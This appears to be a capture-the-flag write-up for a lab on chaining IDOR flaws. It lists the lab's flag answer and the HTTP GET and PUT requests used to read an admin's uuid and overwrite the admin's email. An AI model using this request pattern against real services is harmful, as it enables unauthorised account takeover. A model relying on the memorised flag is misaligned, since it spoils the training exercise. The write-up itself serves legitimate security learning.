# Chaining IDOR Vulnerabilities
## Questions
1. Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page. **Answer: HTB{1_4m_4n_1d0r_m4573r}**
   - Use Intruder to find the admin uid → `uid=15`
   - Look up admin's `uuid` via this IDOR:
        ```
        GET /profile/api.php/profile/15 HTTP/1.1
        ```
        ```
        {
            "uid":15,
            "uuid":"abcxyz",
            ...
        }
        ```
   - Use the PUT request to update admin's profile:
        ```
        PUT /profile/api.php/update/15 HTTP/1.1

        {
            "uid":15,
            "uuid":"abcxyz",
            ...
            "email":"flag@idor.htb"
        }
        ```